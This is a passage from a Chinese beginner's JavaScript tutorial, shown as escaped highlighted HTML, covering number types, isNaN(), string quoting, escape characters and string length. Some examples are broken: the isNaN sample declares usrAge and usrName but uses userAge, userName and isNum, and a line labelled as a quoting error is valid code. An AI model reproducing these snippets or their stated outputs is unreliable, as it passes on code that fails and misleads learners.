&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;num3&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x9&lt;/span&gt;;
            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;num3&lt;/span&gt;);
            &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;num4&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xa&lt;/span&gt;;
            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;num4&lt;/span&gt;);
            &lt;span style=&#34;color:#75715e&#34;&gt;// 3. 数字型的最大值
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(Number.&lt;span style=&#34;color:#a6e22e&#34;&gt;MAX_VALUE&lt;/span&gt;);
            &lt;span style=&#34;color:#75715e&#34;&gt;// 4. 数字型的最小值
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(Number.&lt;span style=&#34;color:#a6e22e&#34;&gt;MIN_VALUE&lt;/span&gt;);
            &lt;span style=&#34;color:#75715e&#34;&gt;// 5. 无穷大
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(Number.&lt;span style=&#34;color:#a6e22e&#34;&gt;MAX_VALUE&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;);	&lt;span style=&#34;color:#75715e&#34;&gt;// Infinity 无穷大
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#75715e&#34;&gt;// 6. 无穷小
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;Number.&lt;span style=&#34;color:#a6e22e&#34;&gt;MAX_VALUE&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;); &lt;span style=&#34;color:#75715e&#34;&gt;// -Infinity 无穷小
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#75715e&#34;&gt;// 7. 非数字
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;pink老师&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;);	&lt;span style=&#34;color:#75715e&#34;&gt;// NaN
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        &amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
    &amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;head&lt;/span&gt;&amp;gt;
	&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;body&lt;/span&gt;&amp;gt;
	&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;body&lt;/span&gt;&amp;gt;
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;html&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;4224-isnan&#34;&gt;4.2.2.4 isNaN()&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;用来判断一个变量是否为非数字的类型，返回&lt;code&gt;true&lt;/code&gt;或者&lt;code&gt;false&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;usrAge&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;;
&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;isOk&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; isNaN(&lt;span style=&#34;color:#a6e22e&#34;&gt;userAge&lt;/span&gt;);
&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;isNum&lt;/span&gt;);				&lt;span style=&#34;color:#75715e&#34;&gt;// false, 21 不是一个非数字
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;usrName&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;andy&amp;#34;&lt;/span&gt;;
&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(isNaN(&lt;span style=&#34;color:#a6e22e&#34;&gt;userName&lt;/span&gt;));	&lt;span style=&#34;color:#75715e&#34;&gt;// true，&amp;#34;andy&amp;#34;是一个非数字
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200505012406.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;html&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;lang&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;en&amp;#34;&lt;/span&gt;&amp;gt;
	&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;head&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;meta&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;charset&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;UTF-8&amp;#34;&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;meta&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;viewport&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;content&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;width=device-width, initial-scale=1.0&amp;#34;&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;meta&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;http-equiv&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;X-UA-Compatible&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;content&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ie=edge&amp;#34;&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;title&lt;/span&gt;&amp;gt;Document&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;title&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
            &lt;span style=&#34;color:#75715e&#34;&gt;// isNaN()	这个方法用来判断非数字，并且返回一个值，如果是数字返回的是false，如果不是数字返回的是true
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(isNaN(&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;));			 &lt;span style=&#34;color:#75715e&#34;&gt;// false
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(isNaN(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;pink老师&amp;#39;&lt;/span&gt;));	&lt;span style=&#34;color:#75715e&#34;&gt;// true
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        &amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
    &amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;head&lt;/span&gt;&amp;gt;
	&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;body&lt;/span&gt;&amp;gt;
	&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;body&lt;/span&gt;&amp;gt;
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;html&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;423-字符串型-string&#34;&gt;4.2.3 字符串型 String&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;字符串型可以是引号中的任意文本，其语法为双引号&lt;code&gt;&amp;quot;&amp;quot;&lt;/code&gt;和单引号&lt;code&gt;&#39;&#39;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;strMsg&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;我爱北京天安门~&amp;#34;&lt;/span&gt;;		&lt;span style=&#34;color:#75715e&#34;&gt;// 使用双引号表示字符串
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;strMsg2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;我爱吃猪蹄~&amp;#39;&lt;/span&gt;;			 &lt;span style=&#34;color:#75715e&#34;&gt;// 使用单引号表示字符串
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// 常见错误
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;strMsg3&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;我爱大肘子&lt;/span&gt;;			 &lt;span style=&#34;color:#75715e&#34;&gt;// 报错，没使用引号，会被认为是js代码，但js没有这些语法
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;因为HTML标签里面的属性使用的是双引号，JS 这里我们更推荐使用单引号&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;4231-字符串引号嵌套&#34;&gt;4.2.3.1 字符串引号嵌套&lt;/h4&gt;
&lt;p&gt;JS 可以用单引号嵌套双引号，或者用双引号嵌套单引号（外双内单，外单内双）&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;strMsg&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;我是&amp;#34;高富帅&amp;#34;程序员&amp;#39;&lt;/span&gt;;		&lt;span style=&#34;color:#75715e&#34;&gt;// 可以用&amp;#39;&amp;#39;包含&amp;#34;&amp;#34;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;strMsg2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;我是&amp;#39;高富帅&amp;#39;程序猿&amp;#34;&lt;/span&gt;;		&lt;span style=&#34;color:#75715e&#34;&gt;// 也可以用&amp;#34;&amp;#34;包含&amp;#39;&amp;#39;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// 常见错误
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;badQuotes&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;What on earth?&amp;#39;&lt;/span&gt;;	 &lt;span style=&#34;color:#75715e&#34;&gt;// 报错，不能单双引号搭配
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;4232-字符串转义符&#34;&gt;4.2.3.2 字符串转义符&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;类似HTML里面的特殊字符，字符串中也有特殊字符，我们称之为转义符&lt;/li&gt;
&lt;li&gt;转义符都是\开头的，常用的转义符及其说明如下：&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200505013846.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;html&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;lang&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;en&amp;#34;&lt;/span&gt;&amp;gt;
	&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;head&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;meta&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;charset&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;UTF-8&amp;#34;&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;meta&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;viewport&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;content&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;width=device-width, initial-scale=1.0&amp;#34;&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;meta&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;http-equiv&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;X-UA-Compatible&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;content&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ie=edge&amp;#34;&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;title&lt;/span&gt;&amp;gt;Document&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;title&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
            &lt;span style=&#34;color:#75715e&#34;&gt;// &amp;#39;pink&amp;#39; &amp;#39;pink老师&amp;#39; &amp;#39;12&amp;#39; &amp;#39;true&amp;#39;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;str&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;我是一个“高富帅”的程序员&amp;#39;&lt;/span&gt;;
            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;str&lt;/span&gt;);
            &lt;span style=&#34;color:#75715e&#34;&gt;// 字符串转义字符 都是用\开头，但是这些转移字符要写到引号里面
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;str1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;我是一个&amp;#39;高富帅&amp;#39;的\n程序员&amp;#34;&lt;/span&gt;
            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;str1&lt;/span&gt;);
        &amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
    &amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;head&lt;/span&gt;&amp;gt;
	&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;body&lt;/span&gt;&amp;gt;
	&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;body&lt;/span&gt;&amp;gt;
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;html&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h5 id=&#34;案例弹出页面警示框&#34;&gt;案例：弹出页面警示框&lt;/h5&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;html&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;lang&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;en&amp;#34;&lt;/span&gt;&amp;gt;
	&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;head&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;meta&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;charset&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;UTF-8&amp;#34;&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;meta&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;viewport&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;content&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;width=device-width, initial-scale=1.0&amp;#34;&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;meta&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;http-equiv&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;X-UA-Compatible&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;content&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ie=edge&amp;#34;&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;title&lt;/span&gt;&amp;gt;Document&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;title&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
            &lt;span style=&#34;color:#a6e22e&#34;&gt;alert&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;酷热难耐，火辣的太阳底下，我挺拔的身姿，成为了最为独特的风景。\n我审视四周，这里，是我的舞台，我就是天地间的王者。这一刻，我豪气冲天，终于大喊一声：&amp;#34;收破烂啦~&amp;#34;&amp;#39;&lt;/span&gt;);
        &amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
    &amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;head&lt;/span&gt;&amp;gt;
	&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;body&lt;/span&gt;&amp;gt;
	&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;body&lt;/span&gt;&amp;gt;
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;html&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;4233-字符串长度&#34;&gt;4.2.3.3 字符串长度&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;字符串是由若干字符组成的，这些字符的数量就是字符串的长度。通过字符串的&lt;code&gt;length&lt;/code&gt;属性可以获取整个字符串的长度&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;html&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;lang&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;en&amp;#34;&lt;/span&gt;&amp;gt;
	&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;head&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;meta&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;charset&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;UTF-8&amp;#34;&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;meta&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;viewport&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;content&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;width=device-width, initial-scale=1.0&amp;#34;&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;meta&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;http-equiv&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;X-UA-Compatible&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;content&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ie=edge&amp;#34;&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;title&lt;/span&gt;&amp;gt;Document&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;title&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
            &lt;span style=&#34;color:#75715e&#34;&gt;// 1. 检测获取字符串的长度 length
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;str&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;my nmae is andy&amp;#39;&lt;/span&gt;;
